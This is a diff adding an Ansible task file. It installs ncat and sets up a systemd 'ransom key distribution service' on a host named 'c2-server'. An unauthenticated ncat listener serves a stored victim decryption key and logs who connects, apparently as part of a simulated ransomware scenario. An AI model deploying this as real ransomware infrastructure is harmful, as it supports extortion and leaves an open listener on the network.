@@ -1,0 +1,41 @@
+---
+- name: Install ncat
+  apt:
+    name: ncat
+    state: present
+    update_cache: yes
+
+- name: Store victim decryption key on c2-server
+  copy:
+    dest: "{{ key_file }}"
+    content: "{{ ransom_key }}\n"
+    owner: root
+    group: root
+    mode: '0600'
+
+- name: Create key server service
+  copy:
+    dest: /etc/systemd/system/ransom-keysrv.service
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=Ransom key distribution service
+      After=network.target
+
+      [Service]
+      Type=simple
+      ExecStart=/bin/sh -c 'ncat -lk {{ listen_port }} -c "cat {{ key_file }}; echo \"[$(date -Is)] $NCAT_REMOTE_ADDR\" >> {{ keysrv_log }}"'
+      Restart=always
+      RestartSec=2
+
+      [Install]
+      WantedBy=multi-user.target
+
+- name: Enable and start key server
+  systemd:
+    name: ransom-keysrv.service
+    enabled: yes
+    state: started
+    daemon_reload: yes
